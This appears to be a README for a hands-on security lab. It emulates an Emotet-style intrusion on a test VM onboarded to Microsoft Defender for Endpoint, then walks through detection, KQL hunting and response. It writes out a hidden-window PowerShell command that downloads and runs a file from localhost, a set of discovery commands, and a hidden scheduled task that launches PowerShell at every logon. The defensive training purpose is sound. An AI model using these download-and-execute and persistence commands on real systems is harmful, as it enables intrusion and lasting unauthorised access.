# Defender-XDR-Defender-for-Endpoint-Simulated-Intrusion-Investigation-Response

# Project 3 — Defender XDR / Defender for Endpoint: Simulated Intrusion, Investigation & Response
 
> Hands-on lab: onboard a device to Microsoft Defender for Endpoint, detonate a realistic multi-stage attack chain, and work the resulting incident end-to-end — detection, correlation, investigation, hunting, and response — from the analyst's chair.
 
---
 
## 1. Scenario — the real-world incident this maps to
 
**Anchor: Emotet.**
 
Emotet began life as a banking trojan and evolved into the most prolific malware-delivery operation of its era. Europol described it as *"the world's most dangerous malware"* when a coordinated international takedown dismantled its infrastructure in January 2021. Its signature access pattern was brutally simple and endlessly effective:
 
> A phishing email carries a weaponised Office document → the victim enables content → a macro reaches out and **downloads a second-stage payload** → the payload gives the operator **hands-on-keyboard control** → the operator runs **discovery** commands and establishes **persistence** before handing the foothold to follow-on malware (TrickBot, then Ryuk ransomware).
 
That exact kill chain — **lure/download → payload → discovery → persistence** — is what this lab reproduces safely on a live, onboarded endpoint.
 
### The problem it solves
 
A single intrusion throws off a *scatter* of low-level signals: a script process making an outbound connection, a file written to a temp path, a burst of reconnaissance commands, a new scheduled task. Individually, each looks like ordinary activity. The analyst's problem is **correlation and triage under time pressure** — tying scattered events into one story with a verdict, a timeline, and a blast radius, fast enough to contain before the follow-on payload lands.
 
This project demonstrates the full workflow an analyst uses to solve that problem: deploy the EDR sensor, generate the attack, let Defender XDR correlate it into a single incident, then investigate and respond — while also proving *where the automated view falls short* and how proactive hunting closes the gap.
 
---
 
## 2. Environment
 
| Component | Detail |
|---|---|
| Tenant | Microsoft 365 E5 trial (Defender for Endpoint P2, Entra ID P2) |
| Target device | `intune-test-vm` — Windows 11 Pro Azure VM, Entra-joined, Intune-enrolled |
| Resource group | `Intune-Lab-RG` |
| Onboarding method | Local script (single-device) |
| Cost control | VM deallocated between sessions; budget alert set |
 
Total Azure spend for the entire project: **~£1.37** — the VM only billed while actively running, and was deallocated after every session.
 
---
 
## 3. Build
 
### 3.1 Onboarding the sensor `[screenshots 01–05]`
 
Onboarded the VM to Defender for Endpoint via the local script:
 
1. **Defender portal → System → Settings → Endpoints → Device management → Onboarding.** Selected Windows 10/11, **Standard** connectivity, **Local Script**. https://github.com/KevoT0/Defender-XDR-Defender-for-Endpoint-Simulated-Intrusion-Investigation-Response/blob/main/1.png
2. Ran `WindowsDefenderATPLocalOnboardingScript.cmd` **elevated** on the VM — the script writes the tenant workspace ID into `HKLM` and starts the **Sense** service (the EDR sensor). Confirmation: *"Successfully onboarded machine to Microsoft Defender for Endpoint."* `[02]`
3. Verified the sensor was live locally: `sc query sense` → `STATE: 4 RUNNING`. `[03]`
4. Ran the detection test, then confirmed the device appeared in **Assets → Devices** as **Active / Onboarded**. `[05]`
**Real-world note (portal drift):** Settings now sits under a **System** parent group in the left nav — older course material and screenshots that say just *"Settings → Endpoints"* no longer match the current layout.
 
### 3.2 Detonating the attack chain `[screenshots 04, 07, 08]`
 
The built-in *Simulations & tutorials* / **Evaluation lab was deprecated by Microsoft in January 2024**, so the course-standard "download and run a Microsoft simulation file" step no longer works on a fresh tenant. I pivoted to **manually reproducing the Emotet kill chain** using benign, industry-standard test artifacts — which is a stronger demonstration anyway, because it shows I understand each stage rather than running a black-box script.
 
All commands were run in an interactive session on the VM to emulate hands-on-keyboard activity.
 
**Stage 1 — Initial access / payload download** (`T1059.001` PowerShell, `T1105` Ingress Tool Transfer) `[04]`
 
```powershell
powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden `
  $ErrorActionPreference='silentlycontinue'; `
  (New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe','C:\test-WDATP-test\invoice.exe'); `
  Start-Process 'C:\test-WDATP-test\invoice.exe'
```
 
A second variant pulled the **EICAR test file** (the universally-recognised benign AV test string) and saved it as `invoice_backdoor.exe` in the temp folder — mimicking a lure dropping a disguised payload. `[07]`
 
**Stage 2 — Discovery / reconnaissance** `[07, 08]`
 
```
whoami /all                              # T1033 System Owner/User Discovery
net user                                 # T1087.001 Account Discovery (local)
net group "Domain Admins" /domain        # T1087.002 Account Discovery (domain)
ipconfig /all                            # T1016 Network Config Discovery
systeminfo                               # T1082 System Information Discovery
```
 
*Honest note:* the VM is `WORKGROUP`, not domain-joined, so `net group "Domain Admins" /domain` **errored** — but the *attempt* was still recorded as telemetry, which is the point.
 
**Stage 3 — Persistence** (`T1053.005` Scheduled Task) `[08]`
 
```
schtasks /create /tn "UpdaterTask" /tr "powershell.exe -w hidden" /sc onlogon /f
```
 
Result: *"SUCCESS: The scheduled task 'UpdaterTask' has successfully been created."* A hidden PowerShell task set to re-launch at every logon — a textbook persistence mechanism named to blend in with legitimate Windows tasks.
 
---
 
## 4. Detection & the central finding
 
### 4.1 What alerted `[screenshots 06, 09]`
 
The chain produced exactly **three alerts** `[09]`:
 
| Alert | Severity | Source | Origin |
|---|---|---|---|
| `'EICAR_Test_File' malware was prevented` | Informational | EDR/AV | Stage 1 dropped file |
| `Suspicious PowerShell command line` | **Medium** | EDR | Stage 1 download command |
| `[Test Alert] Suspicious Powershell commandline` | Informational | EDR | Onboarding detection test |
 
### 4.2 What did NOT alert — and why it matters
 
**The entire discovery burst (Stage 2) and the scheduled-task persistence (Stage 3) generated zero alerts.**
 
This is *by design*, not a failure. `whoami`, `net user`, `net group`, `ipconfig`, `systeminfo`, and `schtasks /create` are among the most common legitimate administrative commands in Windows. Run once, on one host, with no surrounding high-confidence malicious context, none of them crosses a detection threshold. If Defender alerted on every `whoami`, the queue would be unusable.
 
> **Core lesson: Alerts ≠ Telemetry.** An *alert* is a curated, high-confidence verdict. *Telemetry* is the complete record of everything that happened. The discovery commands and the persistence task never alerted — but they were **fully recorded in the hunting tables**. Detection shows you the tip; hunting shows you the iceberg.
 
This single distinction is the thesis of the project, and section 6 proves it with data.
 
---
 
## 5. Investigation `[screenshots 07, 17, 18, 19, 20]`
 
Defender XDR correlated all three alerts into a single incident: **`ID 1: 'EICAR_Test_File' detected on one endpoint`** (Medium). `[07, 17]`
 
### 5.1 Attack story graph `[17]`
 
The incident graph automatically assembled the narrative: the user **azureadmin**, on **intune-test-vm**, ran **powershell.exe / cmd.exe**, which contacted **127.0.0.1** and dropped **invoice_backdoor.exe**. Defender stitched separate alerts into one connected story based on shared device, time proximity, and causal relationship — this is correlation working.
 
### 5.2 Evidence & verdicts — the "why one, not the other" `[18, 19, 20]`
 
The Evidence tab collected six entities. Reading **Verdict** against **Remediation status** is the whole triage lesson:
 
| Entity | Type | Verdict | Remediation | VirusTotal |
|---|---|---|---|---|
| `invoice_backdoor.exe` | File | **Malicious** | ✅ **Prevented** | **63/65** |
| `powershell.exe` (PID 8748) | Process | Suspicious | — | 0/70 |
| `cmd.exe` (PID 5960) | Process | Suspicious | — | — |
| `http://127.0.0.1/1.exe` | URL | Suspicious | — | — |
| `127.0.0.1`, `192.168.0.3` | IP | Suspicious | — | — |
 
**Why the file was auto-remediated but PowerShell wasn't:** `[19 vs 20]`
 
- **EICAR file:** VirusTotal **63/65** — 63 of 65 engines flag it as a globally-known signature (`Virus:DOS/EICAR_Test_File`). High confidence → automatic quarantine, no human needed.
- **powershell.exe:** VirusTotal **0/70**, *"Malware detected: None"* — because PowerShell **is not malware**, it's a legitimate signed Windows binary being used in a *suspicious way*. Defender can't quarantine it (that would break Windows); it can only flag the **behaviour** and defer the verdict to a human.
The PowerShell evidence panel also included **File Capabilities → MITRE ATT&CK mappings** (7 techniques, incl. `T1057 Process Discovery`) — Defender performing static threat-intel enrichment on the entity. `[20]`
 
**Critical-reading takeaway:** the incident graph and evidence are a *good* story — but an **incomplete** one. Nowhere in the incident do the discovery commands or the `schtasks` persistence appear, because they never alerted. An analyst who closed this incident on its own evidence ("malicious file quarantined, threat handled") would leave an **active persistence foothold in place**. The only way to know it's there is to hunt.
 
---
 
## 6. Hunting — proving the blind spot `[screenshots 21, 22, 23]`
 
I pivoted to **Advanced Hunting** (`DeviceProcessEvents`) to surface everything the incident missed.
 
### 6.1 The noise problem `[21]`
 
```kql
DeviceProcessEvents
| summarize count() by FileName
| sort by count_ desc
```
 
Charting *all* process activity is analytically useless — the attack tools are buried under hundreds of legitimate Windows/Defender processes (`conhost.exe`, `svchost.exe`, `MpCmdRun.exe`, `Sense*.exe`). **Lesson: hunting is a filtering problem, not a reading problem.** Recognising and excluding your own security tooling's noise (`Sense*`, `MpCmdRun`, `MsSecFlt`) is half the skill.
 
### 6.2 Scoped to the attack tools `[22]`
 
```kql
DeviceProcessEvents
| where Timestamp > ago(1d)
| where DeviceName startswith "intune-test-vm"
| where FileName in~ ("powershell.exe","cmd.exe","whoami.exe","net.exe",
                      "net1.exe","ipconfig.exe","systeminfo.exe","schtasks.exe")
| summarize Count = count() by FileName
| sort by Count desc
```
 
This cleanly visualises the attacker toolset — including **`schtasks.exe`**, the persistence the incident never captured, plainly present in telemetry. *(Detail worth noting: `net user`/`net group` appear as both `net.exe` and `net1.exe` because `net.exe` delegates to `net1.exe` internally.)*
 
### 6.3 The attack timeline `[23]`
 
```kql
DeviceProcessEvents
| where Timestamp > ago(1d)
| where DeviceName startswith "intune-test-vm"
| where FileName in~ ("powershell.exe","whoami.exe","net.exe","net1.exe",
                      "schtasks.exe","systeminfo.exe","ipconfig.exe")
| project Timestamp, FileName, ProcessCommandLine
| sort by Timestamp asc
```
 
Read top-to-bottom, this table **is** the intrusion, reconstructed from raw telemetry:
 
```
12:35  powershell.exe   ...DownloadFile('http://127.0.0.1/1.exe'...)   ← Initial access
01:02  whoami.exe       "whoami.exe" /all                             ┐
01:02  net.exe          "net.exe" user                                │
01:02  net.exe          "net.exe" group "Domain Admins" /domain       ├ Discovery
01:02  ipconfig.exe     "ipconfig.exe" /all                           │
01:02  systeminfo.exe   systeminfo.exe                                ┘
01:04  schtasks.exe     /create /tn "UpdaterTask" ... /sc onlogon /f  ← Persistence
```
 
**Only the 12:35 line ever became an alert.** Everything from 01:02 onward — the complete discovery-and-persistence sequence — exists *only* here in telemetry. This table, next to the incident graph, is the visual proof of the project's thesis.
 
---
 
## 7. Response `[screenshots 10–16]`
 
### 7.1 Automated response (AIR) `[10, 13]`
 
Automated Investigation & Response triggered on the EICAR alert and **auto-quarantined `invoice_backdoor.exe`** (Action Center → File quarantine, Investigation ID `1`, "Automated device action") — with **no pending actions** awaiting approval. `[10, 13]`
 
Critically, AIR took **no action** on the discovery commands or the scheduled task — because they never alerted, so there was no threat for it to investigate. **Automation handles the obvious; the human handles the subtle.**
 
### 7.2 Manual containment — isolation `[11, 12, 13]`
 
Manually isolated the host from the device page. Chose **Full isolation** (unticked the "allow Outlook/Teams" collaboration exception) — the correct posture for a suspected active compromise — and logged an audit comment: *"Containing host during suspected initial-access investigation — Project 3 lab."* `[12]`
 
Confirmed in Device Inventory: **Mitigation status → Isolated**, with the action logged in Action Center (`15-inv`). `[13]`
 
### 7.3 Release `[14, 16]`
 
Released the host from isolation with a documented comment, and confirmed the mitigation status reverted. Knowing how to *undo* containment cleanly is as important as applying it — isolation without a confident release path causes business outages. `[16]`
 
### 7.4 Remediation & a real-world constraint `[15]`
 
Attempted to remove the `UpdaterTask` persistence **portal-side via Live Response** (no endpoint access — the correct SOC-analyst model). Live Response was enabled, but **"Live Response unsigned script execution" was disabled by default**, which blocked ad-hoc script-based remediation (`The certificate chain was issued by an authority that is not trusted`). `[15]`
 
> **Documented finding:** Defender's portal has no one-click "delete scheduled task" action — task removal *must* go through a Live Response script, and that path is gated by the unsigned-script-execution setting. This is a genuine operational constraint worth knowing before an incident, not after.
 
The persistence was identified, its technique classified (`T1053.005`), and its removal path understood — the analytically valuable work. Final cleanup of the task itself is trivial janitorial work on a disposable lab VM.
 
---
 
## 8. Key takeaways
 
1. **Alerts ≠ Telemetry.** Incidents contain only what alerted. Discovery and persistence built from legitimate tools (`whoami`, `net`, `schtasks`, PowerShell) often generate *no* alerts — yet are fully recorded in the hunting tables. Trusting the incident view alone leaves footholds in place.
2. **Verdict drives response.** Known-bad signatures (EICAR, 63/65) get auto-remediated; legitimate-binary-used-badly (PowerShell, 0/70) gets flagged as *Suspicious* and deferred to a human. Reading Verdict × Remediation is core triage.
3. **Automation handles the obvious; humans handle the subtle.** AIR quarantined the file and ignored the quiet recon/persistence. The analyst's value is in the gap.
4. **Hunting is filtering.** Meaningful hunting means scoping to techniques and excluding your own tooling's noise — not scrolling raw output.
5. **Response is a full loop.** Contain → confirm → investigate → release → remediate, all remotely, all audited. And real tools have real constraints (unsigned-script gating, deprecated features, portal drift) that you document rather than pretend around.
---
 
## 9. MITRE ATT&CK coverage
 
| Tactic | Technique | Lab action |
|---|---|---|
| Initial Access / Execution | T1059.001 PowerShell | Stage 1 download command |
| Command & Control | T1105 Ingress Tool Transfer | `DownloadFile` of payload |
| Discovery | T1033 System Owner/User | `whoami /all` |
| Discovery | T1087.001/.002 Account Discovery | `net user` / `net group` |
| Discovery | T1016 Network Config Discovery | `ipconfig /all` |
| Discovery | T1082 System Info Discovery | `systeminfo` |
| Persistence | T1053.005 Scheduled Task | `schtasks /create UpdaterTask` |
 
---
 
